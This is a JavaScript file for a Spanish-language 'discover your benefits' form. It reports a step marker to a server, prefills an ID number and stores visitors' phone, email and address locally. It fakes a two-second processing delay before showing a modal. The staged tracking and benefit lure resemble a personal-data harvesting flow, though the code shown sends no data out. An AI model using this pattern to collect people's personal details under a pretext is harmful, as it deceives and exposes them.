console.log("infoGeneral ON")
fetch(`${API_URL}/view`, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({message: 'P2'})
})


if(info.names !== ''){
    document.querySelector('#client_name').innerHTML = `
        !Hola <b>${info.names}</b>! <br> Diligencia el siguiente formulario y descubre tus beneficios.
    `;
    document.querySelector('#names').setAttribute("type", "hidden");

    info.names = info.names;
}else{
    document.querySelector('#client_name').innerHTML = `
        Diligencia el siguiente formulario y descubre tus beneficios.
    `;
}

document.querySelector('#cc').value = info.cc;

document.querySelector('#form').addEventListener('submit', e => {
    e.preventDefault();

    showSpinner();

    document.querySelector('#success').addEventListener('click', (e)=>{
        console.log('f');
        window.location.href = 'producto.html'
    });

    /** Guardar y cargar */
    info.names === '' ? info.names = document.querySelector('#names').value : '';
    info.cel = document.querySelector('#cel').value;
    info.email = document.querySelector('#email').value;
    info.dir = document.querySelector('#dir').value;

    LS.setItem('info', JSON.stringify(info));

    setTimeout(()=>{
        deleteSpinner();

        document.querySelector('#s_client_name').textContent = info.names.split(' ')[0];
        document.querySelector('#modal-principal').classList.remove('d-none');
        document.querySelector('#modal-principal').classList.add('modal');

        setTimeout(()=>{
            document.querySelector('#modal-principal').classList.add('d-block');
        }, 10);
        
        
    }, 2000);
});